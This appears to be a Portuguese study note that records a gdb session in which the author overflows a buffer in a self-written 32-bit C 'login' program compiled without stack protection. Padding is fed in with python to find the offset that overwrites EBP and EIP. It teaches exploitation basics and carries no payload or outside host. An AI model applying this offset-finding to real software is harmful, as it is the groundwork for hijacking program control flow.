 Controlando o fluxo de um programa c [ 🐧️ 🐍️ ☠️ ]


💻️ - 32 bits

gcc controlarFLuxo.c -o controlarFLuxo2 -fno-stack-protector

💻️ -  64 bits


gcc controlarFLuxo.c -o controlarFLuxo -fno-stack-protector -m32




**(gdb)** run < <(python -c 'print "a"*32')

Program received signal SIGSEGV, Segmentation fault.
0x56555440 in __isoc99_scanf@plt ()


**(gdb)** disas login

disas login

Dump of assembler code for function login:

   0x565555d9 <+0>:	push   %ebp
   
   0x565555da <+1>:	mov    %esp,%ebp
   
   0x565555dc <+3>:	push   %ebx
   
   0x565555dd <+4>:	sub    $0x24,%esp
   
   0x565555e0 <+7>:	call   0x565554a0 <__x86.get_pc_thunk.bx>
  
   0x565555e5 <+12>:	add    $0x19eb,%ebx
  
   0x565555eb <+18>:	sub    $0xc,%esp
  
   0x565555ee <+21>:	lea    -0x18c8(%ebx),%eax
  
   0x565555f4 <+27>:	push   %eax
  
   0x565555f5 <+28>:	call   0x56555420 <puts@plt>
  
   0x565555fa <+33>:	add    $0x10,%esp # < nao atingiu
  
   0x565555fd <+36>:	sub    $0x8,%esp
  
   0x56555600 <+39>:	lea    -0x1c(%ebp),%eax
  
   0x56555603 <+42>:	push   %eax
  
   0x56555604 <+43>:	lea    -0x18c1(%ebx),%eax
  
   0x5655560a <+49>:	push   %eax
  
   0x5655560b <+50>:	call   0x56555440 <__isoc99_scanf@plt>
  
   0x56555610 <+55>:	add    $0x10,%esp NÃO OBT B's
  
   0x56555613 <+58>:	sub    $0x8,%esp
  
   0x56555616 <+61>:	lea    -0x1c(%ebp),%eax
  
  
   0x56555619 <+64>:	push   %eax
  
   0x5655561a <+65>:	lea    -0x18be(%ebx),%eax
  
   0x56555620 <+71>:	push   %eax
  
   0x56555621 <+72>:	call   0x56555410 <printf@plt>
  
   0x56555626 <+77>:	add    $0x10,%esp
  
   0x56555629 <+80>:	nop
  
   0x5655562a <+81>:	mov    -0x4(%ebp),%ebx
  
   0x5655562d <+84>:	leave  
  
   0x5655562e <+85>:	ret  
     
End of assembler dump.


**(gdb)** b* 0x56555626

Ponto de parada 1 at 0x56555626


**(gdb)** run < <(python -c 'print "a"*32')

Starting program: /home/jfc-me/Área de Trabalho/controle_fluxo_programas/controlarFLuxo < <(python -c 'print "a"*32')

Senha:

login incorreto: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x56555626 in login ()



**(gdb)** x/70xb $esp

0xffffce30:	0x0f	0x57	0x55	0x56	0x4c	0xce	0xff	0xff

0xffffce38:	0xa9	0xb0	0xe0	0xf7	0xe5	0x55	0x55	0x56

0xffffce40:	0x00	0x00	0xfb	0xf7	0x00	0x00	0xfb	0xf7

0xffffce48:	0x00	0x00	0x00	0x00	**0x61**	**0x61**	**0x61**	**0x61**

0xffffce50:	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**

0xffffce58:	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**

0xffffce60:	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**	**0x61**

0xffffce68:	**0x61**	**0x61**	**0x61**	**0x61**	0x00	0x56	0x55	0x56

0xffffce70:	0xd0	0x59	0xfe	0xf7	0x90	0xce



**(gdb)** x/1wx $ebp

0xffffce68:	0x61616161

**(gdb)** disas login

Dump of assembler code for function login:

   0x565555d9 <+0>:	push   %ebp

   0x565555da <+1>:	mov    %esp,%ebp

   0x565555dc <+3>:	push   %ebx

   0x565555dd <+4>:	sub    $0x24,%esp
   
   0x565555e0 <+7>:	call   0x565554a0 <__x86.get_pc_thunk.bx>
   
   0x565555e5 <+12>:	add    $0x19eb,%ebx
   
   0x565555eb <+18>:	sub    $0xc,%esp
   
   0x565555ee <+21>:	lea    -0x18c8(%ebx),%eax
   
   0x565555f4 <+27>:	push   %eax
   
   0x565555f5 <+28>:	call   0x56555420 <puts@plt>
   
   0x565555fa <+33>:	add    $0x10,%esp
   
   0x565555fd <+36>:	sub    $0x8,%esp
   
   0x56555600 <+39>:	lea    -0x1c(%ebp),%eax
   
   0x56555603 <+42>:	push   %eax
   
   0x56555604 <+43>:	lea    -0x18c1(%ebx),%eax
  
   0x5655560a <+49>:	push   %eax
   
   0x5655560b <+50>:	call   0x56555440 <__isoc99_scanf@plt>
   
   0x56555610 <+55>:	add    $0x10,%esp
   
   0x56555613 <+58>:	sub    $0x8,%esp
   
   0x56555616 <+61>:	lea    -0x1c(%ebp),%eax
   
   0x56555619 <+64>:	push   %eax
   
   0x5655561a <+65>:	lea    -0x18be(%ebx),%eax
   
   0x56555620 <+71>:	push   %eax
   
   0x56555621 <+72>:	call   0x56555410 <printf@plt>
   
`=> 0x56555626 <+77>:	add    $0x10,%esp`

   0x56555629 <+80>:	nop
  
   0x5655562a <+81>:	mov    -0x4(%ebp),%ebx
 
   0x5655562d <+84>:	leave  
 
   0x5655562e <+85>:	ret    
   
End of assembler dump.

**(gdb)** run < <(python -c 'print "a"*32+ "BBBB"')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/jfc-me/Área de Trabalho/controle_fluxo_programas/controlarFLuxo < <(python -c 'print "a"*32+ "BBBB"')

Senha:

login incorreto: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB

Breakpoint 1, 0x56555626 in login ()

**(gdb)** c

Continuando.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()



**(gdb)** x/70xb $esp

0xffffcee0:	0x12	0x57	0x55	0x56	0xfc	0xce	0xff	0xff

0xffffcee8:	0xa9	0xb0	0xe0	0xf7	0xe5	0x55	0x55	0x56

0xffffcef0:	0x00	0x00	0xfb	0xf7	0x00	0x00	0xfb	0xf7

0xffffcef8:	0x00	0x00	0x00	0x00	0x61	0x61	0x61	0x61

0xffffcf00:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61

0xffffcf08:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61

0xffffcf10:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61

0xffffcf18:	0x61	0x61	0x61	0x61	0x42	0x42	0x42	0x42

0xffffcf20:	0x00	0x59	0xfe	0xf7	0x40	0xcf



**(gdb)** x/1wx $ebp

0xffffcf18:	0x61616161

**(gdb)** run < <(python -c 'print "a"*28+ "BBBB"')

The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/jfc-me/Área de Trabalho/controle_fluxo_programas/controlarFLuxo < <(python -c 'print "a"*28+ "BBBB"')

Senha:
login incorreto: aaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB

Breakpoint 1, 0x56555626 in login ()


**(gdb)** x/70xb $esp

0xffffce30:	0x0f	0x57	0x55	0x56	0x4c	0xce	0xff	0xff

0xffffce38:	0xa9	0xb0	0xe0	0xf7	0xe5	0x55	0x55	0x56

0xffffce40:	0x00	0x00	0xfb	0xf7	0x00	0x00	0xfb	0xf7

0xffffce48:	0x00	0x00	0x00	0x00	0x61	0x61	0x61	0x61

0xffffce50:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61

0xffffce58:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61

0xffffce60:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61

0xffffce68:	0x61	0x61	0x61	0x61	`0x42	0x42	0x42	0x42`

0xffffce70:	0x00	0x59	0xfe	0xf7	0x90	0xce



**(gdb)** x/1wx $ebp

0xffffce68:	0x42424242

**(gdb)** i r

eax            0x32	50

ecx            0x1	1

edx            0xf7fb1890	-134539120

ebx            0x56556fd0	1448439760

esp            0xffffce30	0xffffce30

ebp            0xffffce68	0xffffce68

esi            0xf7fb0000	-134545408

edi            0x0	0

`eip`            0x56555626	0x56555626 <login+77>

eflags         0x282	[ SF IF ]

cs             0x23	35

ss             0x2b	43

ds             0x2b	43

es             0x2b	43

fs             0x0	0

gs             0x63	99

**(gdb)** c

Continuando.

Program received signal SIGSEGV, Segmentation fault.
0x56555440 in __isoc99_scanf@plt ()

**(gdb)**  i r

eax            0x616148a0	1633765536

ecx            0x1	1

edx            0xf7fb1890	-134539120

ebx            0x61616161	1633771873

esp            0xffffce64	0xffffce64

**ebp**            `0x42424242	0x42424242` # 4 bits a menos

esi            0xf7fb0000	-134545408

edi            0x0	0

eip            0x56555440	0x56555440 <__isoc99_scanf@plt> # 4 bits a mais

eflags         0x10282	[ SF IF RF ]

cs             0x23	35

ss             0x2b	43

ds             0x2b	43

es             0x2b	43

fs             0x0	0

gs             0x63	99


**(gdb)** run < <(python -c 'print "a"*32+ "BBBB"')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/jfc-me/Área de Trabalho/controle_fluxo_programas/controlarFLuxo < <(python -c 'print "a"*32+ "BBBB"')

Senha:
login incorreto: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB

Breakpoint 1, 0x56555626 in login ()

**(gdb)** c

Continuando.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

**(gdb)** i r

eax            0x36	54

ecx            0x1	1

edx            0xf7fb1890	-134539120

ebx            0x61616161	1633771873

esp            0xffffce70	0xffffce70

**ebp**            `0x61616161	0x61616161`

esi            0xf7fb0000	-134545408

edi            0x0	0

**eip**            `0x42424242	0x42424242` 

eflags         0x10282	[ SF IF RF ]

cs             0x23	35

ss             0x2b	43

ds             0x2b	43

es             0x2b	43

fs             0x0	0

gs             0x63	99






run < <(python -c 'print "a"*32 + "🤓️ "')



